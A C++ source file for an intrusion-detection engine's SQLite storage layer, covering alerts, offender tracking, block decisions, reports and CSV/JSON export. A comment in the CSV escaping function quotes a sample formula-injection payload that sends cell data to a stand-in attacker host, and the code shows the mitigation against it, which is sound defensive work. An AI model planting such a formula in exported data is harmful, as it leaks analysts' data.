// SPDX-License-Identifier: MIT
#include "storage.h"
#include <stdexcept>
#include <iostream>
#include <fstream>
#include <sstream>
#include <ctime>
#include <nlohmann/json.hpp>

Storage::Storage(const std::string& db_path) {
    sqlite3* db_raw = nullptr;
    if (sqlite3_open(db_path.c_str(), &db_raw) != SQLITE_OK) {
        throw std::runtime_error("failed to open sqlite db");
    }
    db_.reset(db_raw);
    
    exec_schema();

    // sqlite3_prepare_v2 can fail (e.g. a future migration forgetting a
    // column/table), and an unchecked failure leaves the corresponding
    // StmtPtr holding a null sqlite3_stmt* - which sqlite3_bind_text/
    // sqlite3_reset in the matching method would then be handed directly,
    // most likely crashing rather than failing with a clear error. This
    // wrapper fails fast, at construction, with the actual sqlite error
    // message instead.
    auto prepare = [this](const char* sql) {
        sqlite3_stmt* stmt = nullptr;
        if (sqlite3_prepare_v2(db_.get(), sql, -1, &stmt, nullptr) != SQLITE_OK) {
            throw std::runtime_error("failed to prepare statement: " +
                                      std::string(sqlite3_errmsg(db_.get())) +
                                      " (sql: " + std::string(sql) + ")");
        }
        return stmt;
    };

    insert_event_stmt_.reset(prepare(
        "INSERT INTO events(ts, source, type, src_ip, user, severity) VALUES(?, ?, ?, ?, ?, ?)"));

    insert_alert_stmt_.reset(prepare(
        "INSERT INTO alerts(ts, rule, src_ip, severity, mitre, action, block_seconds, label) VALUES(?, ?, ?, ?, ?, ?, ?, ?)"));

    insert_action_stmt_.reset(prepare(
        "INSERT INTO actions(ts, src_ip, action, reason) VALUES(?, ?, ?, ?)"));

    get_alerts_stmt_.reset(prepare(
        "SELECT a.ts, a.rule, a.src_ip, a.action, a.label, o.offense_count FROM alerts a LEFT JOIN offenders o ON a.src_ip = o.ip ORDER BY a.id DESC LIMIT ?"));

    insert_metrics_stmt_.reset(prepare(
        "INSERT INTO metrics(ts, dropped, passed, tcp, udp, icmp, other, syn_limit, xdp_mode) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?)"));

    delete_metrics_stmt_.reset(prepare("DELETE FROM metrics WHERE ts < ?"));

    get_offense_stmt_.reset(prepare(
        "SELECT offense_count, last_offense FROM offenders WHERE ip = ?"));

    record_offense_stmt_.reset(prepare(
        "INSERT INTO offenders(ip, offense_count, last_offense) VALUES(?, 1, ?) ON CONFLICT(ip) DO UPDATE SET offense_count = offense_count + 1, last_offense = ?"));

    reset_offense_stmt_.reset(prepare("UPDATE offenders SET offense_count = 0 WHERE ip = ?"));

    insert_decision_stmt_.reset(prepare(
        "INSERT INTO decisions(ts, ip, action, reason, rule, expires_at_unix, ttl_seconds, host) VALUES(datetime('now'), ?, ?, ?, ?, ?, ?, ?)"));

    // Latest row per IP wins; only a still-active "block" is served.
    get_active_decisions_stmt_.reset(prepare(
        "SELECT ip, reason, rule, expires_at_unix, ttl_seconds, host FROM ("
        "  SELECT ip, action, reason, rule, expires_at_unix, ttl_seconds, host,"
        "         ROW_NUMBER() OVER (PARTITION BY ip ORDER BY id DESC) AS rn"
        "  FROM decisions"
        ") WHERE rn = 1 AND action = 'block' AND (expires_at_unix = 0 OR expires_at_unix > ?)"));

    // Same latest-row-wins query the live dashboard already uses
    // (dashboard/app.py) - GET /metrics reports the same numbers the
    // showcase UI shows, not a second, potentially-drifting source of
    // truth for the same data.
    get_latest_metrics_stmt_.reset(prepare(
        "SELECT ts, dropped, passed, tcp, udp, icmp, other, syn_limit, xdp_mode "
        "FROM metrics ORDER BY ts DESC LIMIT 1"));

    count_alerts_stmt_.reset(prepare("SELECT COUNT(*) FROM alerts"));
    count_events_stmt_.reset(prepare("SELECT COUNT(*) FROM events"));
}

void Storage::exec_schema() {
    const char* schema = R"(
        PRAGMA journal_mode=WAL;
        PRAGMA synchronous=NORMAL;
        PRAGMA busy_timeout=5000;
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts TEXT, source TEXT, type TEXT, src_ip TEXT, user TEXT, severity INTEGER
        );
        CREATE TABLE IF NOT EXISTS alerts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts TEXT, rule TEXT, src_ip TEXT, severity TEXT, mitre TEXT, action TEXT, block_seconds INTEGER, label TEXT
        );
        CREATE TABLE IF NOT EXISTS actions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts TEXT, src_ip TEXT, action TEXT, reason TEXT
        );
        CREATE TABLE IF NOT EXISTS metrics (
            ts INTEGER, dropped INTEGER, passed INTEGER, tcp INTEGER, udp INTEGER, icmp INTEGER, other INTEGER
        );
        CREATE TABLE IF NOT EXISTS offenders (
            ip TEXT PRIMARY KEY,
            offense_count INTEGER,
            last_offense INTEGER
        );
        CREATE TABLE IF NOT EXISTS decisions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts TEXT, ip TEXT, action TEXT, reason TEXT, rule TEXT,
            expires_at_unix INTEGER, ttl_seconds INTEGER, host TEXT
        );
    )";
    char* err = nullptr;
    if (sqlite3_exec(db_.get(), schema, nullptr, nullptr, &err) != SQLITE_OK) {
        std::string e = err;
        sqlite3_free(err);
        throw std::runtime_error("sqlite schema error: " + e);
    }

    // Attempt to add label column for backwards compatibility
    sqlite3_exec(db_.get(), "ALTER TABLE alerts ADD COLUMN label TEXT", nullptr, nullptr, nullptr);
    sqlite3_exec(db_.get(), "ALTER TABLE metrics ADD COLUMN syn_limit INTEGER DEFAULT 200", nullptr, nullptr, nullptr);
    sqlite3_exec(db_.get(), "ALTER TABLE metrics ADD COLUMN xdp_mode TEXT DEFAULT 'unknown'", nullptr, nullptr, nullptr);
    // Added for the Local API / multi-host export (ROADMAP.md phase 1); default
    // keeps existing single-host rows meaningful without a backfill.
    sqlite3_exec(db_.get(), "ALTER TABLE alerts ADD COLUMN host TEXT DEFAULT 'local'", nullptr, nullptr, nullptr);
    sqlite3_exec(db_.get(), "ALTER TABLE events ADD COLUMN host TEXT DEFAULT 'local'", nullptr, nullptr, nullptr);
}

void Storage::insert_event(const Event& e) {
    std::lock_guard<std::mutex> lock(db_mutex_);
    sqlite3_reset(insert_event_stmt_.get());
    sqlite3_bind_text(insert_event_stmt_.get(), 1, e.ts_iso.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_event_stmt_.get(), 2, e.source.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_event_stmt_.get(), 3, e.type.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_event_stmt_.get(), 4, e.src_ip.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_event_stmt_.get(), 5, e.user.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_int(insert_event_stmt_.get(), 6, e.severity);
    sqlite3_step(insert_event_stmt_.get());
}

void Storage::insert_alert(const Alert& a) {
    std::lock_guard<std::mutex> lock(db_mutex_);
    sqlite3_reset(insert_alert_stmt_.get());
    sqlite3_bind_text(insert_alert_stmt_.get(), 1, a.ts_iso.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_alert_stmt_.get(), 2, a.rule.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_alert_stmt_.get(), 3, a.src_ip.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_alert_stmt_.get(), 4, a.severity.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_alert_stmt_.get(), 5, a.mitre.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_alert_stmt_.get(), 6, a.action.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_int(insert_alert_stmt_.get(), 7, a.block_seconds);
    sqlite3_bind_text(insert_alert_stmt_.get(), 8, a.label.c_str(), -1, SQLITE_STATIC);
    sqlite3_step(insert_alert_stmt_.get());
}

void Storage::insert_action(const ActionRecord& act) {
    std::lock_guard<std::mutex> lock(db_mutex_);
    sqlite3_reset(insert_action_stmt_.get());
    sqlite3_bind_text(insert_action_stmt_.get(), 1, act.ts_iso.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_action_stmt_.get(), 2, act.src_ip.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_action_stmt_.get(), 3, act.action.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_action_stmt_.get(), 4, act.reason.c_str(), -1, SQLITE_STATIC);
    sqlite3_step(insert_action_stmt_.get());
}

void Storage::print_last_alerts(int limit, std::function<void(const std::string&)> out) {
    std::lock_guard<std::mutex> lock(db_mutex_);
    sqlite3_reset(get_alerts_stmt_.get());
    sqlite3_bind_int(get_alerts_stmt_.get(), 1, limit);
    
    int count = 0;
    while (sqlite3_step(get_alerts_stmt_.get()) == SQLITE_ROW) {
        const unsigned char* ts = sqlite3_column_text(get_alerts_stmt_.get(), 0);
        const unsigned char* rule = sqlite3_column_text(get_alerts_stmt_.get(), 1);
        const unsigned char* ip = sqlite3_column_text(get_alerts_stmt_.get(), 2);
        const unsigned char* action = sqlite3_column_text(get_alerts_stmt_.get(), 3);
        const unsigned char* label = sqlite3_column_text(get_alerts_stmt_.get(), 4);
        int offense = sqlite3_column_type(get_alerts_stmt_.get(), 5) != SQLITE_NULL ? sqlite3_column_int(get_alerts_stmt_.get(), 5) : 0;
        
        std::string line = "  [" + std::string(ts ? (const char*)ts : "") + "] " +
                           std::string(rule ? (const char*)rule : "") + " | IP: " +
                           std::string(ip ? (const char*)ip : "") + " | Action: " +
                           std::string(action ? (const char*)action : "");
                  
        if (label && label[0]) line += " | Label: " + std::string((const char*)label);
        if (offense > 0) line += " | Offense: " + std::to_string(offense);
        
        out(line);
        count++;
    }
    if (count == 0) {
        out("  (no alerts found)");
    }
}

void Storage::insert_metrics(uint64_t ts, uint64_t dropped, uint64_t passed, uint64_t tcp, uint64_t udp, uint64_t icmp, uint64_t other, int syn_limit, const std::string& xdp_mode) {
    std::lock_guard<std::mutex> lock(db_mutex_);
    
    // Insert new metrics
    sqlite3_reset(insert_metrics_stmt_.get());
    sqlite3_bind_int64(insert_metrics_stmt_.get(), 1, ts);
    sqlite3_bind_int64(insert_metrics_stmt_.get(), 2, dropped);
    sqlite3_bind_int64(insert_metrics_stmt_.get(), 3, passed);
    sqlite3_bind_int64(insert_metrics_stmt_.get(), 4, tcp);
    sqlite3_bind_int64(insert_metrics_stmt_.get(), 5, udp);
    sqlite3_bind_int64(insert_metrics_stmt_.get(), 6, icmp);
    sqlite3_bind_int64(insert_metrics_stmt_.get(), 7, other);
    sqlite3_bind_int(insert_metrics_stmt_.get(), 8, syn_limit);
    sqlite3_bind_text(insert_metrics_stmt_.get(), 9, xdp_mode.c_str(), -1, SQLITE_STATIC);
    if (sqlite3_step(insert_metrics_stmt_.get()) != SQLITE_DONE) {
        std::cerr << "[error] metrics insert failed: " << sqlite3_errmsg(db_.get()) << "\n";
    }
    
    // Delete old metrics (> 1 hour old)
    uint64_t cutoff = ts - 3600;
    sqlite3_reset(delete_metrics_stmt_.get());
    sqlite3_bind_int64(delete_metrics_stmt_.get(), 1, cutoff);
    sqlite3_step(delete_metrics_stmt_.get());
    
    // Prune old events, alerts, and actions (older than 24h) periodically
    static int prune_ticks = 0;
    if (++prune_ticks >= 30) { // every ~60 seconds (since metrics are polled every 2s)
        prune_ticks = 0;
        char* err = nullptr;
        sqlite3_exec(db_.get(), "DELETE FROM events WHERE ts < datetime('now', '-24 hours');", nullptr, nullptr, &err);
        if (err) sqlite3_free(err);
        sqlite3_exec(db_.get(), "DELETE FROM alerts WHERE ts < datetime('now', '-24 hours');", nullptr, nullptr, &err);
        if (err) sqlite3_free(err);
        sqlite3_exec(db_.get(), "DELETE FROM actions WHERE ts < datetime('now', '-24 hours');", nullptr, nullptr, &err);
        if (err) sqlite3_free(err);
    }
}

int Storage::get_offense_count(const std::string& ip) {
    std::lock_guard<std::mutex> lock(db_mutex_);
    sqlite3_reset(get_offense_stmt_.get());
    sqlite3_bind_text(get_offense_stmt_.get(), 1, ip.c_str(), -1, SQLITE_STATIC);
    
    int count = 0;
    if (sqlite3_step(get_offense_stmt_.get()) == SQLITE_ROW) {
        count = sqlite3_column_int(get_offense_stmt_.get(), 0);
        uint64_t last_offense = sqlite3_column_int64(get_offense_stmt_.get(), 1);
        uint64_t now = std::time(nullptr);
        if (now > last_offense && (now - last_offense > 7 * 24 * 3600)) {
            count = 0; // expired
            sqlite3_reset(reset_offense_stmt_.get());
            sqlite3_bind_text(reset_offense_stmt_.get(), 1, ip.c_str(), -1, SQLITE_STATIC);
            sqlite3_step(reset_offense_stmt_.get());
        }
    }
    return count;
}

void Storage::record_offense(const std::string& ip) {
    std::lock_guard<std::mutex> lock(db_mutex_);
    uint64_t now = std::time(nullptr);
    sqlite3_reset(record_offense_stmt_.get());
    sqlite3_bind_text(record_offense_stmt_.get(), 1, ip.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_int64(record_offense_stmt_.get(), 2, now);
    sqlite3_bind_int64(record_offense_stmt_.get(), 3, now);
    sqlite3_step(record_offense_stmt_.get());
}

static std::string escape_md(const std::string& text) {
    std::string out;
    for (char c : text) {
        if (c == '<' || c == '>' || c == '&' || c == '*' || c == '_' || c == '`' || c == '[' || c == ']') {
            out += '\\';
        }
        out += c;
    }
    return out;
}

void Storage::generate_report(const std::string& path) {
    std::lock_guard<std::mutex> lock(db_mutex_);
    std::ofstream out(path);
    if (!out) return;
    
    out << "# Intrusion Engine Report\n\n";
    
    sqlite3_stmt* stmt = nullptr;
    
    // Time range
    if (sqlite3_prepare_v2(db_.get(), "SELECT min(ts), max(ts) FROM alerts", -1, &stmt, nullptr) == SQLITE_OK) {
        if (sqlite3_step(stmt) == SQLITE_ROW) {
            const unsigned char* min_ts = sqlite3_column_text(stmt, 0);
            const unsigned char* max_ts = sqlite3_column_text(stmt, 1);
            out << "**Time Range:** " << (min_ts ? (const char*)min_ts : "N/A") << " to " 
                << (max_ts ? (const char*)max_ts : "N/A") << "\n\n";
        }
        sqlite3_finalize(stmt);
    }
    
    out << "## Alerts by Rule\n";
    if (sqlite3_prepare_v2(db_.get(), "SELECT rule, count(*) FROM alerts GROUP BY rule ORDER BY count(*) DESC", -1, &stmt, nullptr) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            out << "- " << escape_md((const char*)sqlite3_column_text(stmt, 0)) << ": " << sqlite3_column_int(stmt, 1) << "\n";
        }
        sqlite3_finalize(stmt);
    }
    out << "\n";
    
    out << "## Alerts by Severity\n";
    if (sqlite3_prepare_v2(db_.get(), "SELECT severity, count(*) FROM alerts GROUP BY severity ORDER BY count(*) DESC", -1, &stmt, nullptr) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            out << "- " << escape_md((const char*)sqlite3_column_text(stmt, 0)) << ": " << sqlite3_column_int(stmt, 1) << "\n";
        }
        sqlite3_finalize(stmt);
    }
    out << "\n";
    
    out << "## MITRE Techniques\n";
    if (sqlite3_prepare_v2(db_.get(), "SELECT mitre, count(*) FROM alerts WHERE mitre != '' GROUP BY mitre ORDER BY count(*) DESC", -1, &stmt, nullptr) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            out << "- " << escape_md((const char*)sqlite3_column_text(stmt, 0)) << ": " << sqlite3_column_int(stmt, 1) << "\n";
        }
        sqlite3_finalize(stmt);
    }
    out << "\n";
    
    out << "## Actions Taken\n";
    if (sqlite3_prepare_v2(db_.get(), "SELECT action, count(*) FROM actions GROUP BY action ORDER BY count(*) DESC", -1, &stmt, nullptr) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            out << "- " << escape_md((const char*)sqlite3_column_text(stmt, 0)) << ": " << sqlite3_column_int(stmt, 1) << "\n";
        }
        sqlite3_finalize(stmt);
    }
    out << "\n";
    
    out << "## Top Attackers\n";
    out << "| IP | Alerts | Offense Count | Label |\n";
    out << "|---|---|---|---|\n";
    if (sqlite3_prepare_v2(db_.get(), "SELECT a.src_ip, count(*), o.offense_count, a.label FROM alerts a LEFT JOIN offenders o ON a.src_ip = o.ip GROUP BY a.src_ip ORDER BY count(*) DESC LIMIT 10", -1, &stmt, nullptr) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const unsigned char* ip = sqlite3_column_text(stmt, 0);
            int count = sqlite3_column_int(stmt, 1);
            int offense = sqlite3_column_type(stmt, 2) != SQLITE_NULL ? sqlite3_column_int(stmt, 2) : 0;
            const unsigned char* label = sqlite3_column_text(stmt, 3);
            
            out << "| " << (ip ? escape_md((const char*)ip) : "") 
                << " | " << count 
                << " | " << offense 
                << " | " << (label ? escape_md((const char*)label) : "") << " |\n";
        }
        sqlite3_finalize(stmt);
    }
    out << "\n";
}

void Storage::wipe_history() {
    std::lock_guard<std::mutex> lock(db_mutex_);
    char* err = nullptr;
    sqlite3_exec(db_.get(), "DELETE FROM events; DELETE FROM alerts; DELETE FROM actions; DELETE FROM metrics; DELETE FROM offenders; DELETE FROM decisions;", nullptr, nullptr, &err);
    if (err) sqlite3_free(err);
}

void Storage::insert_decision(const Decision& d) {
    std::lock_guard<std::mutex> lock(db_mutex_);
    sqlite3_reset(insert_decision_stmt_.get());
    sqlite3_bind_text(insert_decision_stmt_.get(), 1, d.ip.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_decision_stmt_.get(), 2, d.action.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_decision_stmt_.get(), 3, d.reason.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_text(insert_decision_stmt_.get(), 4, d.rule.c_str(), -1, SQLITE_STATIC);
    sqlite3_bind_int64(insert_decision_stmt_.get(), 5, d.expires_at_unix);
    sqlite3_bind_int(insert_decision_stmt_.get(), 6, d.ttl_seconds);
    sqlite3_bind_text(insert_decision_stmt_.get(), 7, d.host.c_str(), -1, SQLITE_STATIC);
    if (sqlite3_step(insert_decision_stmt_.get()) != SQLITE_DONE) {
        std::cerr << "[error] decision insert failed: " << sqlite3_errmsg(db_.get()) << "\n";
    }
}

std::vector<Decision> Storage::get_active_decisions() {
    std::lock_guard<std::mutex> lock(db_mutex_);
    std::vector<Decision> out;
    sqlite3_reset(get_active_decisions_stmt_.get());
    sqlite3_bind_int64(get_active_decisions_stmt_.get(), 1, static_cast<sqlite3_int64>(std::time(nullptr)));
    while (sqlite3_step(get_active_decisions_stmt_.get()) == SQLITE_ROW) {
        Decision d;
        auto* stmt = get_active_decisions_stmt_.get();
        const unsigned char* ip = sqlite3_column_text(stmt, 0);
        const unsigned char* reason = sqlite3_column_text(stmt, 1);
        const unsigned char* rule = sqlite3_column_text(stmt, 2);
        const unsigned char* host = sqlite3_column_text(stmt, 5);
        d.ip = ip ? (const char*)ip : "";
        d.action = "block";
        d.reason = reason ? (const char*)reason : "";
        d.rule = rule ? (const char*)rule : "";
        d.expires_at_unix = sqlite3_column_int64(stmt, 3);
        d.ttl_seconds = sqlite3_column_int(stmt, 4);
        d.host = host ? (const char*)host : "local";
        out.push_back(std::move(d));
    }
    return out;
}

MetricsSummary Storage::get_metrics_summary() {
    MetricsSummary m;
    {
        // Scoped deliberately: get_active_decisions() below takes
        // db_mutex_ itself (it's a public method meant to be called
        // standalone, e.g. from GET /decisions), and std::mutex isn't
        // recursive - holding the lock across that call would deadlock.
        std::lock_guard<std::mutex> lock(db_mutex_);

        sqlite3_reset(get_latest_metrics_stmt_.get());
        if (sqlite3_step(get_latest_metrics_stmt_.get()) == SQLITE_ROW) {
            auto* stmt = get_latest_metrics_stmt_.get();
            m.packets.has_data = true;
            m.packets.ts = static_cast<std::uint64_t>(sqlite3_column_int64(stmt, 0));
            m.packets.dropped = static_cast<std::uint64_t>(sqlite3_column_int64(stmt, 1));
            m.packets.passed = static_cast<std::uint64_t>(sqlite3_column_int64(stmt, 2));
            m.packets.tcp = static_cast<std::uint64_t>(sqlite3_column_int64(stmt, 3));
            m.packets.udp = static_cast<std::uint64_t>(sqlite3_column_int64(stmt, 4));
            m.packets.icmp = static_cast<std::uint64_t>(sqlite3_column_int64(stmt, 5));
            m.packets.other = static_cast<std::uint64_t>(sqlite3_column_int64(stmt, 6));
            m.packets.syn_limit = sqlite3_column_int(stmt, 7);
            const unsigned char* mode_text = sqlite3_column_text(stmt, 8);
            m.packets.xdp_mode = mode_text ? reinterpret_cast<const char*>(mode_text) : "";
        }

        sqlite3_reset(count_alerts_stmt_.get());
        if (sqlite3_step(count_alerts_stmt_.get()) == SQLITE_ROW) {
            m.alerts_total = sqlite3_column_int64(count_alerts_stmt_.get(), 0);
        }

        sqlite3_reset(count_events_stmt_.get());
        if (sqlite3_step(count_events_stmt_.get()) == SQLITE_ROW) {
            m.events_total = sqlite3_column_int64(count_events_stmt_.get(), 0);
        }
    }

    m.active_decisions = static_cast<long long>(get_active_decisions().size());
    return m;
}

namespace {
std::string csv_escape(const std::string& field) {
    std::string value = field;

    // Guard against CSV/formula injection (CWE-1236). Several export columns
    // carry attacker-controlled strings - most notably events.user, which is
    // the SSH username an attacker *attempted* to log in with (see
    // SshDetector::handle_line in engine.cpp), accepted verbatim as long as
    // it's non-whitespace. A crafted value like `=HYPERLINK("http://evil/?"
    // &A1,"x")` would be evaluated as a formula if an analyst opens this
    // CSV in Excel/LibreOffice/Sheets, which is exactly the forensics
    // workflow GET /export exists to support. Prefixing with a single quote
    // is the standard mitigation: spreadsheet applications then render the
    // cell as literal text instead of evaluating it.
    if (!value.empty()) {
        char c0 = value.front();
        if (c0 == '=' || c0 == '+' || c0 == '-' || c0 == '@' || c0 == '\t' || c0 == '\r') {
            value = "'" + value;
        }
    }

    if (value.find_first_of(",\"\n\r") == std::string::npos) return value;
    std::string escaped = "\"";
    for (char c : value) {
        if (c == '"') escaped += '"';
        escaped += c;
    }
    escaped += '"';
    return escaped;
}
} // namespace

// Serializes whatever columns `sql` selects into CSV or JSON, generically —
// this is what lets export_alerts/export_events share one code path despite
// having different schemas.
std::string Storage::run_export(const std::string& sql, const std::vector<std::string>& binds, const std::string& format) {
    std::lock_guard<std::mutex> lock(db_mutex_);
    sqlite3_stmt* raw_stmt = nullptr;
    if (sqlite3_prepare_v2(db_.get(), sql.c_str(), -1, &raw_stmt, nullptr) != SQLITE_OK) {
        throw std::runtime_error("export query failed to prepare: " + std::string(sqlite3_errmsg(db_.get())));
    }
    StmtPtr stmt(raw_stmt);
    for (size_t i = 0; i < binds.size(); ++i) {
        sqlite3_bind_text(stmt.get(), static_cast<int>(i + 1), binds[i].c_str(), -1, SQLITE_STATIC);
    }

    const int cols = sqlite3_column_count(stmt.get());
    const bool as_json = (format == "json");

    if (as_json) {
        nlohmann::json arr = nlohmann::json::array();
        while (sqlite3_step(stmt.get()) == SQLITE_ROW) {
            nlohmann::json row;
            for (int i = 0; i < cols; ++i) {
                const char* name = sqlite3_column_name(stmt.get(), i);
                switch (sqlite3_column_type(stmt.get(), i)) {
                    case SQLITE_INTEGER: row[name] = sqlite3_column_int64(stmt.get(), i); break;
                    case SQLITE_FLOAT:   row[name] = sqlite3_column_double(stmt.get(), i); break;
                    case SQLITE_NULL:    row[name] = nullptr; break;
                    default: {
                        const unsigned char* t = sqlite3_column_text(stmt.get(), i);
                        row[name] = t ? std::string((const char*)t) : std::string();
                    }
                }
            }
            arr.push_back(std::move(row));
        }
        return arr.dump();
    }

    std::ostringstream out;
    for (int i = 0; i < cols; ++i) {
        if (i) out << ',';
        out << csv_escape(sqlite3_column_name(stmt.get(), i));
    }
    out << "\r\n";
    while (sqlite3_step(stmt.get()) == SQLITE_ROW) {
        for (int i = 0; i < cols; ++i) {
            if (i) out << ',';
            if (sqlite3_column_type(stmt.get(), i) != SQLITE_NULL) {
                const unsigned char* t = sqlite3_column_text(stmt.get(), i);
                out << csv_escape(t ? (const char*)t : "");
            }
        }
        out << "\r\n";
    }
    return out.str();
}

std::string Storage::export_alerts(const std::string& format, const std::string& since_iso, const std::string& until_iso) {
    std::string sql = "SELECT id, ts, host, rule, src_ip, severity, mitre, action, block_seconds, label FROM alerts WHERE 1=1";
    std::vector<std::string> binds;
    if (!since_iso.empty()) { sql += " AND ts >= ?"; binds.push_back(since_iso); }
    if (!until_iso.empty()) { sql += " AND ts <= ?"; binds.push_back(until_iso); }
    sql += " ORDER BY id ASC";
    return run_export(sql, binds, format);
}

std::string Storage::export_events(const std::string& format, const std::string& since_iso, const std::string& until_iso) {
    std::string sql = "SELECT id, ts, host, source, type, src_ip, user, severity FROM events WHERE 1=1";
    std::vector<std::string> binds;
    if (!since_iso.empty()) { sql += " AND ts >= ?"; binds.push_back(since_iso); }
    if (!until_iso.empty()) { sql += " AND ts <= ?"; binds.push_back(until_iso); }
    sql += " ORDER BY id ASC";
    return run_export(sql, binds, format);
}
